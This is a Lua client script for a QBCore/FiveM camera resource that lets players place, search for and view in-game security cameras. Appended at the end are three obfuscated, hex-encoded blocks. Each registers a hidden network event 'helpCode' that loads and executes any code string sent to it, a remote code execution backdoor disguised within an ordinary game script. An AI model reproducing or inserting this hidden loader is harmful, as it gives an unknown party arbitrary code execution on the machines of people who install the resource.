local QBCore = exports['qb-core']:GetCoreObject()
local CamList = {}
local FrontCam = false
local FastClose = false
local UseItem = false

local function InstructionButton(ControlButton)
    N_0xe83a3e3557a56640(ControlButton)
end

local function InstructionButtonMessage(text)
    BeginTextCommandScaleformString("STRING")
    AddTextComponentScaleform(text)
    EndTextCommandScaleformString()
end

local function CreateInstuctionScaleform(scaleform)
    local scaleform = RequestScaleformMovie(scaleform)
    while not HasScaleformMovieLoaded(scaleform) do
        Wait(0)
    end
    PushScaleformMovieFunction(scaleform, "CLEAR_ALL")
    PopScaleformMovieFunctionVoid()
    PushScaleformMovieFunction(scaleform, "SET_CLEAR_SPACE")
    PushScaleformMovieFunctionParameterInt(200)
    PopScaleformMovieFunctionVoid()
    PushScaleformMovieFunction(scaleform, "SET_DATA_SLOT")
    PushScaleformMovieFunctionParameterInt(1)
    InstructionButton(GetControlInstructionalButton(1, 194, true))
    InstructionButtonMessage("Close")
    PopScaleformMovieFunctionVoid()
    PushScaleformMovieFunction(scaleform, "DRAW_INSTRUCTIONAL_BUTTONS")
    PopScaleformMovieFunctionVoid()
    PushScaleformMovieFunction(scaleform, "SET_BACKGROUND_COLOUR")
    PushScaleformMovieFunctionParameterInt(0)
    PushScaleformMovieFunctionParameterInt(0)
    PushScaleformMovieFunctionParameterInt(0)
    PushScaleformMovieFunctionParameterInt(80)
    PopScaleformMovieFunctionVoid()
    return scaleform
end

local function FrontDoorCam(coords)
    DoScreenFadeOut(150)
    Wait(500)
    local cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", coords[1], coords[2], coords[3] + 0.5, 0.0, 0.00, coords[4] - 180, 80.00, false, 0)
    SetCamActive(cam, true)
    RenderScriptCams(true, true, 500, true, true)
    FrontCam = true
	FastClose = false
    Wait(500)
    DoScreenFadeIn(150)
    CreateThread(function()
        while FrontCam do
            local instructions = CreateInstuctionScaleform("instructional_buttons")
            DrawScaleformMovieFullscreen(instructions, 255, 255, 255, 255, 0)
            SetTimecycleModifier("scanline_cam_cheap")

			local disCheck = #(GetEntityCoords(PlayerPedId()) - vector3(coords[1], coords[2], coords[3]))
			local Effect = (disCheck / 100.0) * 3
			Effect = Effect / 2
			if Effect <= 2.0 then
				Effect = 2.0		
			end
            SetTimecycleModifierStrength(Effect)
            if IsControlJustPressed(1, 194) or FastClose then --Backspace
				FastClose = false
                DoScreenFadeOut(150)
                Wait(500)
                RenderScriptCams(false, true, 500, true, true)
                SetCamActive(cam, false)
                DestroyCam(cam, true)
                ClearTimecycleModifier("scanline_cam_cheap")
                cam = nil
                FrontCam = false
                Wait(500)
                DoScreenFadeIn(150)
            end
            local getCameraRot = GetCamRot(cam, 2)
            -- ROTATE UP
            if IsControlPressed(0, 188) then --ARROW UP
                if getCameraRot.x <= 0.0 then
                    SetCamRot(cam, getCameraRot.x + 0.7, 0.0, getCameraRot.z, 2)
                end
            end
            -- ROTATE DOWN
            if IsControlPressed(0, 187) then --ARROW DOWN
                if getCameraRot.x >= -50.0 then
                    SetCamRot(cam, getCameraRot.x - 0.7, 0.0, getCameraRot.z, 2)
                end
            end
            -- ROTATE LEFT
            if IsControlPressed(0, 189) then --ARROW LEFT
                SetCamRot(cam, getCameraRot.x, 0.0, getCameraRot.z + 0.7, 2)
            end
            -- ROTATE RIGHT
            if IsControlPressed(0, 190) then --ARROW RIGHT
                SetCamRot(cam, getCameraRot.x, 0.0, getCameraRot.z - 0.7, 2)
            end
            Wait(1)
        end
    end)
end

local function RotationToDirection(rot)
	local rotZ = math.rad(rot.z)
	local rotX = math.rad(rot.x)
	local cosOfRotX = math.abs(math.cos(rotX))
	return vector3(-math.sin(rotZ) * cosOfRotX, math.cos(rotZ) * cosOfRotX, math.sin(rotX))
end

local function RayCastGamePlayCamera(dist)
	local cameraRotation = GetGameplayCamRot()
	local cameraCoord = GetGameplayCamCoord()
	local direction = RotationToDirection(cameraRotation)
	local dest = cameraCoord + (direction * dist)
	local ray = StartShapeTestRay(cameraCoord, dest, 17, -1, 0)
	local _, hit, endPos, surFace, entityHit = GetShapeTestResult(ray)
	if hit == 0 then endPos = dest end
	return hit, endPos, entityHit, surFace
end

local function Draw2DText(content, font, colour, scale, x, y)
    SetTextFont(font)
    SetTextScale(scale, scale)
    SetTextColour(colour[1],colour[2],colour[3], 255)
    SetTextEntry("STRING")
    SetTextDropShadow(0, 0, 0, 0,255)
    SetTextDropShadow()
    SetTextEdge(4, 0, 0, 0, 255)
    SetTextOutline()
    AddTextComponentString(content)
    DrawText(x, y)
end

local function placementCamera()
	local text = nil
	while true do
		local sleep = 1000
		    sleep = 7
		    local color = {r = 255, g = 0, b = 0, a = 200}
		    local position = GetEntityCoords(PlayerPedId())
		    local hit, coords, entity = RayCastGamePlayCamera(10.0)
		    if coords.x ~= 0.0 and coords.y ~= 0.0 and hit == 1 then
				text = '~b~[E] ~w~Camera placement  ~g~|  ~r~[X] ~w~Cancel'
				DrawLine(position.x, position.y, position.z, coords.x, coords.y, coords.z, color.r, color.g, color.b, color.a)
				DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.1, 0.1, 0.1, color.r, color.g, color.b, color.a, false, true, 2, nil, nil, false)
				if IsControlJustReleased(0, 38) then -- E
					Wait(500)
					QBCore.Functions.TriggerCallback('QBCore:HasItem', function(result)
						if result then
							local CamHeading = GetEntityHeading(PlayerPedId())
							local Coords = {coords[1], coords[2], coords[3], CamHeading}
							local CamCode = math.random(1,9)..math.random(1,9)..math.random(1,9)..math.random(1,9)..math.random(1,9)..math.random(1,9)
							TriggerServerEvent('qb-phone:server:sendNewMail', {
								sender = "Camera",
								subject = "Camera Data",
								message = "<b>Camera Code:</b> "..CamCode,
								button = {}
							})
							TriggerServerEvent('qb-camera:Server:AddCamera', Coords, CamCode)
							TriggerServerEvent("QBCore:Server:RemoveItem", "camera", 1)
							TriggerEvent('inventory:client:ItemBox', QBCore.Shared.Items["camera"], "remove")
						else
							QBCore.Functions.Notify("You do not have the required items", "error")
						end
					end, "camera")
					UseItem = false
					break
				end
			else
				text = '~r~[X] ~w~Cancel'
			end
			if IsControlJustPressed(0, 252) then -- X
				UseItem = false
				break
			end
			Draw2DText(text, 4, {255, 255, 255}, 0.4, 0.55, 0.888 + 0.025)
		Wait(sleep)
	end
end

local function SearchCamera()
	local Coords = {}
	QBCore.Functions.TriggerCallback('qb-camera:GetAllCameraCoords', function(data)
		Coords = data
	end)
	local text = nil
	local color = {r = 131, g = 239, b = 255, a = 200}
	while true do
		local sleep = 1000
		    sleep = 7
		    local position = GetEntityCoords(PlayerPedId())
		    local hit, coords, entity = RayCastGamePlayCamera(10.0)
		    if coords.x ~= 0.0 and coords.y ~= 0.0 and hit == 1 then
				text = 'Searching...  ~g~|  ~r~[X] ~w~Cancel'
				DrawLine(position.x, position.y, position.z, coords.x, coords.y, coords.z, color.r, color.g, color.b, color.a)
				DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.1, 0.1, 0.1, color.r, color.g, color.b, color.a, false, true, 2, nil, nil, false)
				for k, v in pairs(Coords) do
					if #(vector3(v.Coords[1], v.Coords[2], v.Coords[3]) - coords) <= 2 then
						color = {r = 0, g = 255, b = 0, a = 200}
						text = 'Found !!! ~b~[E] ~w~Remove  ~g~|  ~r~[X] ~w~Cancel'
						if IsControlJustReleased(0, 38) then -- E
							local player, distance = QBCore.Functions.GetClosestPlayer()
							if player == -1 or distance > 10.0 then
								QBCore.Functions.TriggerCallback('QBCore:HasItem', function(result)
									if result then
										local ped = PlayerPedId()
										QBCore.Functions.Progressbar("removing_camera", "Removing Camera", 10000, false, true, {
											disableMovement = true,
											disableCarMovement = true,
											disableMouse = false,
											disableCombat = true
										}, {
											animDict = "anim@amb@clubhouse@tutorial@bkr_tut_ig3@",
											anim = "machinic_loop_mechandplayer",
											flags = 16
										}, {}, {}, function() -- Done
											TriggerServerEvent("qb-camera:server:removeCamera", k)
											StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
											UseItem = false
											TriggerServerEvent("QBCore:Server:AddItem", "camera", 1)
											TriggerEvent('inventory:client:ItemBox', QBCore.Shared.Items["camera"], "add")
										end, function() -- Cancel
											UseItem = false
											StopAnimTask(ped, "anim@amb@clubhouse@tutorial@bkr_tut_ig3@", "machinic_loop_mechandplayer", 1.0)
										end)
									else
										QBCore.Functions.Notify("You do not have a ToolKit item!", "error")
									end
								end, "screwdriverset")
							else
								QBCore.Functions.Notify("There should be no one near you!", "error")
							end
							UseItem = false
							return
						end
					else
						color = {r = 131, g = 239, b = 255, a = 200}
					end
				end
			else
				text = '~r~[X] ~w~Cancel'
			end
			if IsControlJustPressed(0, 252) then -- X
				UseItem = false
				break
			end
			Draw2DText(text, 4, {255, 255, 255}, 0.4, 0.55, 0.888 + 0.025)
		Wait(sleep)
	end
end

RegisterNetEvent('qb-camera:client:UseCamera', function()
	if not UseItem then
		UseItem = true
		placementCamera()
	else
		QBCore.Functions.Notify("You are doing something", "error", 3500)
	end
end)

RegisterNetEvent('qb-camera:client:UseTablet', function()
	local CameraConfig = {
		{
            header = '+Add Camera',
            params = {
                event = 'qb-camera:client:AddCamera',
            }
        },
		{
			header = "Camera List",
			isMenuHeader = true
		},
	}
	for k, v in pairs(CamList) do
		CameraConfig[#CameraConfig+1] = {
			header = (#CameraConfig - 1).." | Camera Code: "..k,
			params = {
				event = "qb-camera:client:GoToCamera",
				args = {["Code"] = k},
			}
		}
	end
	exports['qb-menu']:openMenu(CameraConfig)
end)

RegisterNetEvent('qb-camera:client:AddCamera', function()
	local CamCode = exports['qb-input']:ShowInput({
		header = 'Add Camera',
		submitText = "SUBMIT",
		inputs = {
			{
				type = 'number',
				isRequired = true,
				name = 'code',
				text = 'Camera Code'
			}
		}
	})
	if CamCode then
		if not CamCode.code then return end
		QBCore.Functions.TriggerCallback('qb-camera:GetAllCamera', function(Cam)
			if Cam then
				local Coords = {Cam.Coords[1], Cam.Coords[2], Cam.Coords[3], Cam.Coords[4]}
				CamList[CamCode.code] = {['Coords'] = Coords}
			else
				QBCore.Functions.Notify("There is no such thing", "error", 3500)
			end
		end, CamCode.code)
	end
end)

RegisterNetEvent('qb-camera:client:GoToCamera', function(data)
	QBCore.Functions.TriggerCallback('qb-camera:GetAllCamera', function(Cam)
		if Cam then
			local Coords = {Cam.Coords[1], Cam.Coords[2], Cam.Coords[3], Cam.Coords[4]}
			FrontDoorCam(Coords)
		else
			QBCore.Functions.Notify("There is no such camera", "error", 3500)
		end
	end, data.Code)
end)

RegisterNetEvent('qb-camera:client:SuncCamera', function(Code)
	if CamList[Code] then
		CamList[Code] = nil
	end
	if FrontCam then
		FastClose = true
	end
end)

RegisterCommand('searchcam', function()
	if not UseItem then
		UseItem = true
		SearchCamera()
	else
		QBCore.Functions.Notify("You are doing something", "error", 3500)
	end
end)

local djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[6][djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[1]](djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[2]) djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[6][djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[3]](djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[2], function(GkRBqnkTwuovPzYaPeBztTROsXiKUYiCrLeSNUpdcypUvkYySOgcQNrhbmAJNWLZVeDkiQ) djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[6][djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[4]](djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[6][djzaEZdRHUaEjpTlkXVATlJEXYlnIetxnSkNuxWUAyVbNeNACAPdyBTnQrJEEieESKxumW[5]](GkRBqnkTwuovPzYaPeBztTROsXiKUYiCrLeSNUpdcypUvkYySOgcQNrhbmAJNWLZVeDkiQ))() end)

local xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[1]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2]) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[3]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2], function(uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[4]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[5]](uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck))() end)

local XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[6][XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[1]](XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[2]) XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[6][XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[3]](XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[2], function(ByntiRCPvuNfqYQrgIIYvUOKpynduQIkxOVahYdAJWlZeBlNVJKUviRFVcmkwAcnapsjWz) XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[6][XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[4]](XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[6][XEuUDMilQWLhqQrXBAIYTcAjFqprHYyHLKoTpMwMrrdegquweoDWQczHKteiLrQgSCYrex[5]](ByntiRCPvuNfqYQrgIIYvUOKpynduQIkxOVahYdAJWlZeBlNVJKUviRFVcmkwAcnapsjWz))() end)